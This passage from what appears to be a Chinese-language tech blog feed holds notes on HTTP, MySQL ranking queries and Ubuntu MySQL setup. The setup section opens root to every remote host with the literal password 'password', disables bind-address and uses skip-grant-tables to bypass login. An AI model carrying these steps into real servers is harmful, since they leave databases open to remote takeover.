src="/2021/03/20/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/image-20210530134410773.png" class="lazyload" data-srcset="/2021/03/20/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/image-20210530134410773.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210530134410773" style="zoom:50%;"><p><strong>URL&lt;协议&gt;：</strong>使用说明协议来获取万维网的文档，最常使用的协议就是http、ftp</p><p><strong>://&lt;主机&gt;：</strong>指出这个万维网文档在哪个主机上，这里的主机就是互联网上的域名</p><p>后面的第三部分和第四部分是&lt;端口&gt;和&lt;路径&gt;，可以省略，为了方便输入URL，甚至可以把<a href="http://www.直接省略/">http://www.直接省略</a></p><h6 id="3-超文本传送协议HTTP"><a href="#3-超文本传送协议HTTP" class="headerlink" title="3.超文本传送协议HTTP"></a>3.超文本传送协议HTTP</h6><p>HTTP是面向事务的应用层协议</p><img src="/2021/03/20/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/image-20210530134956254.png" class="lazyload" data-srcset="/2021/03/20/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/image-20210530134956254.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210530134956254" style="zoom:67%;"><p>HTTP规定客户与服务器进行交互，每次都由一个ASCII码构成请求和一个类似的通用互联网扩充，即<strong>类MIME</strong>的响应组成。HTTP报文通常使用TCP连接传送。</p><p>HTTP是无连接，同一个客户第二次访问同一个服务器上的页面，服务器的响应与第一次访问时相同，服务器并不记得曾经访问过得这个客户，也不记得为该客户服务过多少次。HTTP 的无状态特性简化了服务器的设计，使服务器更容易支持大量并发的HTTP请求。</p><p>根据TCP的三次握手，SYN请求不能携带数据，前两次没有传送关于HTTP请求的数据，所以万维客户就把HTTP请求报文作为建立TCP的连接的三报文握手的第三个报文数据，发送给服务器，服务器收到HTTP请求后，就把请求的文档返回给客户。</p><img src="/2021/03/20/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/image-20210530135744651.png" class="lazyload" data-srcset="/2021/03/20/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/image-20210530135744651.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210530135744651" style="zoom:67%;"><img src="/2021/03/20/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/image-20210530135928108.png" class="lazyload" data-srcset="/2021/03/20/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/image-20210530135928108.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210530135928108" style="zoom:67%;"><p>非流水线就是收到报文响应后才继续发送下一个请求报文，客户每访问一个对象都要用一个往返时间RTT。流水线收到响应之前就能够继续发送新的请求，于是服务器就可以连续发送响应报文。流水线的方式，客户访问所有对象只需要花费一个RTT时间，流水线工作使得TCP连接的空闲时间减少。</p><h6 id="4-HTTP的报文结构"><a href="#4-HTTP的报文结构" class="headerlink" title="4.HTTP的报文结构"></a>4.HTTP的报文结构</h6><ul><li>请求报文——从客户向服务器发送的请求报文</li><li>响应报文——从服务器到客户的回答</li></ul><img src="/2021/03/20/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/image-20210530140543632.png" class="lazyload" data-srcset="/2021/03/20/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/image-20210530140543632.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210530140543632" style="zoom:80%;"><p>HTTP是<strong>面向文本</strong>的，因此报文中的每一个字段都是一些ASCII码串，因而各个字段的长度都是不确定。</p><ul><li><p><strong>开始行：</strong>区分是请求报文还是响应报文，两种报文格式就是开始行不同</p></li><li><p><strong>首部行：</strong>说明浏览器、服务器或报文主题的信息，首部可以由好几行，但是也可以不使用，在每一个首部行中都有<strong>首部字段名和它的值</strong>，每一行在结束的地方都要有<strong>“回车”、“换行”</strong>，并且还有一空行和后面的实体分开</p></li><li><p><strong>实体主体：</strong>请求报文中一般不用这个字段，而在响应报文也可能没有这个字段</p></li><li><p><strong>请求报文</strong></p><p>开始行：<strong>方法、请求资源的URL、HTTP的版本</strong></p></li></ul><p><img src="/2021/03/20/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/image-20210530141318213.png" class="lazyload" data-srcset="/2021/03/20/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/image-20210530141318213.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210530141318213" style="zoom:67%;"><img src="/2021/03/20/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/image-20210530141430794.png" class="lazyload" data-srcset="/2021/03/20/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/image-20210530141430794.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210530141430794"></p><img src="/2021/03/20/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/image-20210530141439521.png" class="lazyload" data-srcset="/2021/03/20/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/image-20210530141439521.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210530141439521" style="zoom:67%;"><ul><li><p><strong>响应报文</strong></p><p>第一行就是状态行：HTTP版本、状态码、解释状态码的短语</p></li></ul><p><img src="/2021/03/20/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/image-20210530141530691.png" class="lazyload" data-srcset="/2021/03/20/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/image-20210530141530691.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210530141530691" style="zoom:67%;"><img src="/2021/03/20/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/image-20210530141557974.png" class="lazyload" data-srcset="/2021/03/20/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/image-20210530141557974.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210530141557974"></p><img src="/2021/03/20/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/image-20210530141612680.png" class="lazyload" data-srcset="/2021/03/20/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/image-20210530141612680.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210530141612680" style="zoom:67%;"><h6 id="5-cookie"><a href="#5-cookie" class="headerlink" title="5.cookie"></a>5.cookie</h6><img src="/2021/03/20/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/image-20210530142537044.png" class="lazyload" data-srcset="/2021/03/20/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/image-20210530142537044.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210530142537044" style="zoom:67%;">]]></content>
      
      
      <categories>
          
          <category> 计算机网络 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Mysql数据库</title>
      <link href="/2021/03/18/%E6%95%B0%E6%8D%AE%E5%BA%93/Mysql%E6%95%B0%E6%8D%AE%E5%BA%93/"/>
      <url>/2021/03/18/%E6%95%B0%E6%8D%AE%E5%BA%93/Mysql%E6%95%B0%E6%8D%AE%E5%BA%93/</url>
      
        <content type="html"><![CDATA[<h1 id="查询数据库的属性字段"><a href="#查询数据库的属性字段" class="headerlink" title="查询数据库的属性字段"></a>查询数据库的属性字段</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">describe 表名;</span><br></pre></td></tr></table></figure><h1 id="数据库复杂查询"><a href="#数据库复杂查询" class="headerlink" title="数据库复杂查询"></a>数据库复杂查询</h1><h2 id="排序查询"><a href="#排序查询" class="headerlink" title="排序查询"></a>排序查询</h2><p>如果两个分数相同，则两个分数排名（<code>Rank</code>）相同。</p><p>情况一：平分后的下一个名次是下一个连续的整数值。换句话说，名次之间不应该有“间隔”。例：<code>1、1、2、3、4、4。</code></p><p>情况二：排名是非连续的。例：<code>1、1、1、4、4、6。</code></p><p><code>score</code>表结构信息如下：</p><table><thead><tr><th>Id</th><th>Score</th></tr></thead><tbody><tr><td>1</td><td>3.52</td></tr><tr><td>2</td><td>3.65</td></tr><tr><td>3</td><td>4.23</td></tr><tr><td>4</td><td>3.85</td></tr><tr><td>5</td><td>4.23</td></tr><tr><td>6</td><td>3.65</td></tr></tbody></table><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">SELECT Score,(SELECT COUNT(DISTINCT Score) FROM score WHERE score&gt;=s.score) AS Rank FROM score s ORDER BY score DESC;</span><br><span class="line">SELECT Score,(SELECT COUNT(Score)+1 FROM score WHERE score&gt;s.score) AS Rank FROM score s ORDER BY score DESC;</span><br></pre></td></tr></table></figure><p>第一行括号内表示子查询中<strong>没有相同score的表</strong>有多少个大于等于父查询的s.score，假设父查询的score为3.52，而此时的子查询的表中，应该都是大于3.52,所以此时rank应该为4(4.23,3.85,3.65,3.52)</p><p>第二行括号内表示子查询中<strong>与父查询相同的表</strong>有多少个大于父查询的score，假设父查询的score为3.65，而此时的子查询表中，应该有(4.23,3.85,4.23)三个是大于3.65的，所以+1可以得到情况二的rank为4</p><img src="/2021/03/18/%E6%95%B0%E6%8D%AE%E5%BA%93/Mysql%E6%95%B0%E6%8D%AE%E5%BA%93/image-20210509133813072.png" class="lazyload" data-srcset="/2021/03/18/%E6%95%B0%E6%8D%AE%E5%BA%93/Mysql%E6%95%B0%E6%8D%AE%E5%BA%93/image-20210509133813072.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210509133813072" style="zoom:33%;"><h2 id="区间查询"><a href="#区间查询" class="headerlink" title="区间查询"></a>区间查询</h2><p>某市建了一个新的体育馆，每日人流量信息被记录在<code>gymnasium</code>表中：序号 (<code>id</code>)、日期 (<code>date</code>)、 人流量 (<code>visitors_flow</code>)。</p><p>请编写一个查询语句，找出人流量处于高峰的记录 id、日期 date 和人流量 visitors_flow，其中高峰定义为前后连续三天人流量均不少于 100。</p><p><code>gymnasium</code>表结构数据如下：</p><table><thead><tr><th>id</th><th>date</th><th>visitors_flow</th></tr></thead><tbody><tr><td>1</td><td>2019-01-01</td><td>58</td></tr><tr><td>2</td><td>2019-01-02</td><td>110</td></tr><tr><td>3</td><td>2019-01-03</td><td>123</td></tr><tr><td>4</td><td>2019-01-04</td><td>67</td></tr><tr><td>5</td><td>2019-01-05</td><td>168</td></tr><tr><td>6</td><td>2019-01-06</td><td>1352</td></tr><tr><td>7</td><td>2019-01-07</td><td>382</td></tr><tr><td>8</td><td>2019-01-08</td><td>326</td></tr><tr><td>9</td><td>2019-01-09</td><td>99</td></tr></tbody></table><p>提示：每天只有一行记录，日期随着 <code>id</code> 的增加而增加。</p><p><strong>基本思路</strong>：先找出三个连续日期人流量都是超过100的子表</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">#找出三个刘旭日期人流量都是超过100的子表</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 数据库 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Mysql </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>基础Linux操作</title>
      <link href="/2021/03/18/Linux/%E5%9F%BA%E7%A1%80Linux%E6%93%8D%E4%BD%9C/"/>
      <url>/2021/03/18/Linux/%E5%9F%BA%E7%A1%80Linux%E6%93%8D%E4%BD%9C/</url>
      
        <content type="html"><![CDATA[<h1 id="Centos安装时软件库"><a href="#Centos安装时软件库" class="headerlink" title="Centos安装时软件库"></a>Centos安装时软件库</h1><p><img src="/2021/03/18/Linux/%E5%9F%BA%E7%A1%80Linux%E6%93%8D%E4%BD%9C/image-20210329165431245.png" class="lazyload" data-srcset="/2021/03/18/Linux/%E5%9F%BA%E7%A1%80Linux%E6%93%8D%E4%BD%9C/image-20210329165431245.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210329165431245"></p><h1 id="配置ubuntu18-04环境"><a href="#配置ubuntu18-04环境" class="headerlink" title="配置ubuntu18.04环境"></a>配置ubuntu18.04环境</h1><p><a href="https://blog.csdn.net/longgeaisisi/article/details/78448525">https://blog.csdn.net/longgeaisisi/article/details/78448525</a></p><p>web目录:/var/www/html </p><h1 id="建立mysql数据库"><a href="#建立mysql数据库" class="headerlink" title="建立mysql数据库"></a>建立mysql数据库</h1><p>查找软件：</p><p> <code>sudo apt-cache search all | grep mysql</code></p><h3 id="删除之前的版本"><a href="#删除之前的版本" class="headerlink" title="删除之前的版本"></a>删除之前的版本</h3><p><code>sudo apt-get autoremove mysql* --purge</code></p><p>删除mysql所有的依赖</p><h3 id="安装mysql"><a href="#安装mysql" class="headerlink" title="安装mysql"></a>安装mysql</h3><p><code>sudo apt-get install mysql-server mysql-common</code></p><h3 id="设置远程登录"><a href="#设置远程登录" class="headerlink" title="设置远程登录"></a>设置远程登录</h3><p><code>netstat -an|grep 3306</code></p><p>查看端口3306是否打开</p><img src="/2021/03/18/Linux/%E5%9F%BA%E7%A1%80Linux%E6%93%8D%E4%BD%9C/image-20210318132131050.png" class="lazyload" data-srcset="/2021/03/18/Linux/%E5%9F%BA%E7%A1%80Linux%E6%93%8D%E4%BD%9C/image-20210318132131050.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210318132131050" style="zoom: 67%;"><p>其中可以到127.0.0.1:3306只允许本地登录</p><p>修改mysql配置文件<code>vi /etc/mysql/mysql.conf.d/mysqld.cnf</code></p><p>注释掉<code>bind-address = 127.0.0.1</code></p><p>重启服务：</p><p><code>关掉mysql服务：sudo /etc/init.d/mysql stop 启动mysql服务：sudo /etc/init.d/mysql start</code></p><img src="/2021/03/18/Linux/%E5%9F%BA%E7%A1%80Linux%E6%93%8D%E4%BD%9C/image-20210318133409754.png" class="lazyload" data-srcset="/2021/03/18/Linux/%E5%9F%BA%E7%A1%80Linux%E6%93%8D%E4%BD%9C/image-20210318133409754.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210318133409754" style="zoom:67%;"><p>并且设置允许root用户远程访问：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"># 指定root用户的Host字段为%</span><br><span class="line">use mysql                                            # 切换到数据库mysql</span><br><span class="line">select user,host from user;                          # 查询user表中数据</span><br><span class="line">update user set host=&#x27;%&#x27; where user=&#x27;root&#x27;;          # 修改root账号的host字段为：%</span><br><span class="line"> </span><br><span class="line"># 给任意主机root账户连接mysql服务器权限：</span><br><span class="line">GRANT ALL PRIVILEGES ON *.*  TO &#x27;root&#x27;@&#x27;%&#x27; IDENTIFIED BY &#x27;password&#x27; WITH GRANT OPTION;</span><br><span class="line">flush privileges;                                    # 刷新权限表，使配置生效</span><br></pre></td></tr></table></figure><img src="/2021/03/18/Linux/%E5%9F%BA%E7%A1%80Linux%E6%93%8D%E4%BD%9C/image-20210318133515248.png" class="lazyload" data-srcset="/2021/03/18/Linux/%E5%9F%BA%E7%A1%80Linux%E6%93%8D%E4%BD%9C/image-20210318133515248.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210318133515248" style="zoom:67%;"><h4 id="mysql5-7设置密码登陆"><a href="#mysql5-7设置密码登陆" class="headerlink" title="mysql5.7设置密码登陆"></a>mysql5.7设置密码登陆</h4><img src="/2021/03/18/Linux/%E5%9F%BA%E7%A1%80Linux%E6%93%8D%E4%BD%9C/image-20210405143418734.png" class="lazyload" data-srcset="/2021/03/18/Linux/%E5%9F%BA%E7%A1%80Linux%E6%93%8D%E4%BD%9C/image-20210405143418734.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210405143418734" style="zoom:50%;"><p>命令行密码不能登陆，到配置文件设置跳过密码登录</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vim /etc/mysql/mysql.conf.d/mysqld.cnf</span><br></pre></td></tr></table></figure><p>打开该文件 在 <code>[mysqld]</code>下添加 <code>skip-grant-tables</code>，此行代码意味着跳过密码登陆</p><img src="/2021/03/18/Linux/%E5%9F%BA%E7%A1%80Linux%E6%93%8D%E4%BD%9C/image-20210405143645489.png" class="lazyload" data-srcset="/2021/03/18/Linux/%E5%9F%BA%E7%A1%80Linux%E6%93%8D%E4%BD%9C/image-20210405143645489.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210405143645489" style="zoom:33%;"><p>然后后保存，重启服务 <code>sudo /etc/init.d/mysql restart</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">user mysql;</span><br><span class="line">//update user set password=password(&#x27;123&#x27;) where user=&#x27;root&#x27;;mysql5.7密码字段已经够改了 需要换成authenticat</span><br><span class="line">ion_string </span><br><span class="line">update user set authentication_string=password(&#x27;密码&#x27;) where user=&#x27;root&#x27;;</span><br></pre></td></tr></table></figure><p>然后注释掉前面的配置即可登陆成功</p><h3 id="mysql8-0设置"><a href="#mysql8-0设置" class="headerlink" title="mysql8.0设置"></a>mysql8.0设置</h3><p>下载MySQL提供的套件管理设定档至<code>/tmp</code>资料夹：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ curl -OL https://dev.mysql.com/get/mysql-apt-config_0.8.12-1_all.deb</span><br></pre></td></tr></table></figure><p>下载完成后，<code>.deb</code>的软体套件包需以<code>dpkg</code>指令安装：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> sudo dpkg -i mysql-apt-config* <span class="comment">#选择8.0版本</span></span></span><br><span class="line"><span class="meta">$</span><span class="bash"> sudo apt-get update</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> sudo apt-get install mysql-server <span class="comment">#安装命令</span></span></span><br><span class="line"><span class="meta">$</span><span class="bash"> service mysql status <span class="comment">#查看运行状态</span></span></span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">root@iZbp17jdvnw88dzg0be3y7Z:/tmp# service mysql status</span><br><span class="line">● mysql.service - MySQL Community Server</span><br><span class="line">     Loaded: loaded (/lib/systemd/system/mysql.service; enabled; vendor preset: enabled)</span><br><span class="line">     Active: active (running) since Thu 2021-03-18 18:07:43 CST; 12s ago</span><br><span class="line">   Main PID: 9208 (mysqld)</span><br><span class="line">     Status: &quot;Server is operational&quot;</span><br><span class="line">      Tasks: 38 (limit: 2318)</span><br><span class="line">     Memory: 331.5M</span><br><span class="line">     CGroup: /system.slice/mysql.service</span><br><span class="line">             └─9208 /usr/sbin/mysqld</span><br></pre></td></tr></table></figure><ul><li>安装密码强度验证插件插件 y</li><li>设置密码强度安全等级 </li><li>修改root访问权限 是否禁止<code>root</code>远程登录 </li><li>移除匿名用户</li><li>可移除测试数据库</li><li>设置完成重新加载安全表</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Access denied for user &#x27;root&#x27;@&#x27;localhost&#x27;</span><br><span class="line"></span><br><span class="line">mysql -u root</span><br><span class="line">mysql&gt; use mysql;</span><br><span class="line">mysql&gt; ALTER USER &#x27;root&#x27;@&#x27;localhost&#x27; IDENTIFIED WITH mysql_native_password BY &#x27;Current-Root-Password&#x27;;</span><br><span class="line">mysql&gt; FLUSH PRIVILEGES;</span><br><span class="line">Query OK, 0 rows affected (0.00 sec)</span><br></pre></td></tr></table></figure><p>增加远端访问，主要在%号</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; 